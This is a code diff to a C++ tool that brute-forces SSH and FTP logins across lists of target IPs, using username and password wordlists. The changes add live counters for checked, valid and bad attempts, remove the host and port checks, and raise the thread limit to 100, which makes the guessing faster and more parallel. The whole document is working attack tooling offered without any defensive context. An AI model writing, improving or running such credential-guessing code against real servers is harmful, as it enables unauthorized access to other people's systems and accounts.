@@ -17,6 +17,10 @@ using namespace std;
 // Global Variables
 vector<std::thread> threads;
 atomic<bool> found(false);
+atomic<int> checkedCount(0);
+atomic<int> validCount(0);
+atomic<int> badCount(0);
+mutex statsMutex;
 
 // RESET
 #define RESET   "\033[0m"
@@ -63,84 +67,38 @@ vector<string> loadTargetsFromFile(const string& filePath) {
     return targets;
 }
 
-bool waitForResponse(int sock, int timeoutSec) {
-    fd_set readfds;
-    FD_ZERO(&readfds);
-    FD_SET(sock, &readfds);
-
-    timeval timeout{};
-    timeout.tv_sec = timeoutSec;
-    timeout.tv_usec = 0;
-
-    int result = select(sock + 1, &readfds, NULL, NULL, &timeout);
-    return (result > 0);
+void resetStats() {
+    checkedCount = 0;
+    validCount = 0;
+    badCount = 0;
 }
 
-bool isHostUp(string ip){
-
-  cout<< CYAN <<"[!] Checking the host os up or down"<<endl;
-  vector<int> ports = {21, 22, 23, 25, 53, 80, 110, 139,143, 443, 445, 3306, 3389, 8080};
-  
-  for(int port:ports){
-
-    int sock = socket(AF_INET,SOCK_STREAM,0);
-
-    if (sock < 0) {
-      cerr<<"[-] Error to initialize socket"<<endl;
-      return false;
-    }
-
-    struct timeval timeout{3,0};
-    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(const void*)&timeout,sizeof(timeout));
-
-    struct sockaddr_in target{};
-    target.sin_family = AF_INET;
-    target.sin_port = htons(port);
-
-    if (inet_pton(AF_INET,ip.c_str(),&target.sin_addr) <= 0) {
-      cerr<< RED << "[!] Invalid ip address"<<endl;
-      return false;
-    }
-
-    int result = connect(sock,(struct sockaddr*)&target,sizeof(target));
-    close(sock);
-
-    if(result == 0){
-      return true;
-    }
-
-  }
-
-  return false;
+void showStats() {
+    lock_guard<mutex> lock(statsMutex);
+    cout << "\r" << CYAN << "check: " << checkedCount.load()
+         << WHITE << "  valid: " << GREEN << validCount.load()
+         << WHITE << "  bad: " << RED << badCount.load()
+         << RESET << flush;
 }
 
-bool portChecker(string ip,int port){
-
-  int sock = socket(AF_INET,SOCK_STREAM,0);
-  if (sock < 0) {
-    cerr<< RED << "[-] Error to initialize socket"<<endl;
-    return false;
-  }
-
-  struct timeval timeout {4,0};
-  setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,(const void*)&timeout,sizeof(timeout));
-
-  struct sockaddr_in target{};
-  target.sin_family = AF_INET;
-  target.sin_port = htons(port);
-  inet_pton(AF_INET, ip.c_str(), &target.sin_addr);
-
-  int conn = connect(sock, (struct sockaddr*)&target, sizeof(target));
-  close(sock);
-  return (conn == 0);
-
+void finalizeStatsLine() {
+    showStats();
+    cout << endl;
 }
 
-bool ftpBrute(string username, string password, string ip, int port) {
+void updateStats(bool success) {
+    checkedCount++;
+    if (success) validCount++;
+    else badCount++;
+    showStats();
+}
+
+bool ftpBrute(const string& username, const string& password, const string& ip, int port) {
     if (found) return false;
 
     CURL *curl;
     CURLcode res;
+    bool success = false;
     string ftp_url = "ftp://" + ip + ":" + to_string(port) + "/";
     string userpass = username + ":" + password;
 
@@ -154,27 +112,30 @@ bool ftpBrute(string username, string password, string ip, int port) {
         res = curl_easy_perform(curl);
         curl_easy_cleanup(curl);
 
-        if (res == CURLE_OK) {
-            cout << GREEN << "[+] Success => " << username << ":" << password << endl;
-            found = true;
-            return true;
-        } else {
-            cout << RED << "[-] Failed => " << username << ":" << password << " => "
-                 << curl_easy_strerror(res) << endl;
-        }
+        success = (res == CURLE_OK);
     } else {
-        cerr << RED << "[-] curl_easy_init() failed!" << endl;
+        success = false;
     }
 
+    updateStats(success);
+    if (success) {
+        cout << "\n" << GREEN << "[+] Success => " << username << ":" << password << RESET << endl;
+        found = true;
+        return true;
+    }
     return false;
 }
 
-bool sshBrute(string username,string password,string ip,int port){
+bool sshBrute(const string& username, const string& password, const string& ip, int port){
 
   if (found) return false;
+  bool success = false;
 
   ssh_session session = ssh_new();
-  if (!session) return false;
+  if (!session) {
+    updateStats(false);
+    return false;
+  }
 
   ssh_options_set(session,SSH_OPTIONS_HOST,ip.c_str());
   ssh_options_set(session,SSH_OPTIONS_PORT,&port);
@@ -182,21 +143,24 @@ bool sshBrute(string username,string password,string ip,int port){
 
   int rc = ssh_connect(session);
   if (rc != SSH_OK) {
-    cout<<RED <<"[-] Failed to connect with ssh"<<endl;
     ssh_free(session);
+    updateStats(false);
     return false;
   }
 
   rc = ssh_userauth_password(session,nullptr,password.c_str());
   if (rc == SSH_AUTH_SUCCESS) {
-    cout <<GREEN << "[+] Success => " << username << ":" << password << endl;
+    success = true;
     found = true;
     ssh_disconnect(session);
     ssh_free(session);
+    updateStats(true);
+    cout << "\n" << GREEN << "[+] Success => " << username << ":" << password << RESET << endl;
     return true;
   }
   ssh_disconnect(session);
   ssh_free(session);
+  updateStats(success);
   return false;
 }
 
@@ -231,6 +195,7 @@ int banner() {
 
 void bruteWithUserListOnly(const string& ip, int port, int service, const string& filename, const string& password, int maxThread) {
     found = false;
+    resetStats();
     ifstream file(filename);
     string username;
 
@@ -245,7 +210,6 @@ void bruteWithUserListOnly(const string& ip, int port, int service, const string
 
     while (getline(file, username)) {
         if (username.empty()) continue;
-        cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
 
         if (service == 1) {
             threads.emplace_back(sshBrute, username, password, ip, port);
@@ -264,6 +228,7 @@ void bruteWithUserListOnly(const string& ip, int port, int service, const string
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
     }
+    finalizeStatsLine();
 
     file.close();
 }
@@ -271,6 +236,7 @@ void bruteWithUserListOnly(const string& ip, int port, int service, const string
 
 void bruteWithPassListOnly(const string& ip, int port, int service, const string& filename, const string& username, int maxThread) {
     found = false;
+    resetStats();
     ifstream file(filename);
     string password;
 
@@ -285,7 +251,6 @@ void bruteWithPassListOnly(const string& ip, int port, int service, const string
 
     while (getline(file, password)) {
         if (password.empty()) continue;
-        cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
 
         if (service == 1) {
             threads.emplace_back(sshBrute, username, password, ip, port);
@@ -304,6 +269,7 @@ void bruteWithPassListOnly(const string& ip, int port, int service, const string
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
     }
+    finalizeStatsLine();
 
     file.close();
 }
@@ -312,6 +278,7 @@ void bruteWithPassListOnly(const string& ip, int port, int service, const string
 
 void bruteWithUserAndPassList(const string& ip, int port, int service, const string& userfile, const string& passfile, int maxThread) {
     found = false;
+    resetStats();
     string username, password;
     ifstream ufile(userfile);
     ifstream pfile(passfile);
@@ -333,7 +300,6 @@ void bruteWithUserAndPassList(const string& ip, int port, int service, const str
 
         while (getline(pfile, password)) {
             if (password.empty()) continue;
-            cout << BLUE << "[*]" << WHITE << " Trying " << username << ":" << password << endl;
 
             if (service == 1) {
                 threads.emplace_back(sshBrute, username, password, ip, port);
@@ -355,6 +321,7 @@ void bruteWithUserAndPassList(const string& ip, int port, int service, const str
     if (!found.load()) {
         cout << RED << "[-] No valid credential found" << RESET << endl;
     }
+    finalizeStatsLine();
 
     ufile.close();
     pfile.close();
@@ -445,10 +412,14 @@ int main () {
         cin >> passFile;
     }
 
-    cout << YELLOW << "\n[?] Max Thread (5-10): ";
+    cout << YELLOW << "\n[?] Max Thread (1-100): ";
     cin >> maxThread;
     if (maxThread < 1) {
         cout << RED << "[-] Max Thread must be at least 1" << RESET << endl;
+        return 1;
+    }
+    if (maxThread > 100) {
+        cout << RED << "[-] Max Thread must be <= 100" << RESET << endl;
         return 1;
     }
 
@@ -468,28 +439,12 @@ int main () {
         }
     }
 
-    string serviceName = (service == 1) ? "SSH" : "FTP";
-
     for (size_t i = 0; i < targets.size(); ++i) {
         const string currentIp = trim(targets[i]);
         if (currentIp.empty()) continue;
 
         banner();
-        cout << CYAN << "[!] Target " << (i + 1) << "/" << targets.size() << ": " << currentIp << RESET << endl;
-        cout << CYAN << "[!] Checking the host is up or down..." << RESET << endl;
-
-        if (!isHostUp(currentIp)) {
-            cout << RED << "[-] The host is down or unreachable: " << currentIp << RESET << endl;
-            continue;
-        }
-        cout << GREEN << "[+] The host is up: " << currentIp << RESET << endl;
-
-        cout << CYAN << "[!] Checking " << serviceName << " port is open or not..." << RESET << endl;
-        if (!portChecker(currentIp, port)) {
-            cout << RED << "[-] Port " << port << " is closed on " << currentIp << RESET << endl;
-            continue;
-        }
-        cout << GREEN << "[+] Port " << port << " is open on " << currentIp << RESET << endl;
+        cout << CYAN << "[!] Target: " << currentIp << RESET << endl;
 
         if (mode == 1) {
             bruteWithUserListOnly(currentIp, port, service, userFile, password, maxThread);
